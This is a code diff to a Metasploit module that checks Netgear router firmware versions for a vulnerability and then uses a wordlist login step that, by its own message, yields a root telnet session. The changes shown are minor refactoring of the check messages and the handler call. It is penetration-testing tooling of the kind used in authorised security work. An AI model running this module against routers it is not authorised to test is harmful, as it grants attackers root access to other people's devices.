@@ -94,13 +94,13 @@ class MetasploitModule < Msf::Auxiliary
     # Check version is vulnerable
     print_status("Target is a #{model_name} router running firmware version #{major_version}_#{minor_version}")
     if (Rex::Version.new(major_version) >= Rex::Version.new('1.2.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.2.0.88'))
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Firmware #{major_version} is in the vulnerable range")
     elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.0.1.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.0.1.80'))
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Firmware #{major_version} is in the vulnerable range")
     elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Firmware #{major_version} is in the vulnerable range")
     elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears("Firmware #{major_version} is in the vulnerable range")
     else
       return Exploit::CheckCode::Safe('Not a vulnerable router version!')
     end
@@ -248,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
     file_handle.close
     handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
     print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
-    handler.run
+    handler.run_simple
     File.delete('netgear_pnpx_wordlist.txt') if File.exist?('netgear_pnpx_wordlist.txt') # Remove the file once we are done.
   end
 end
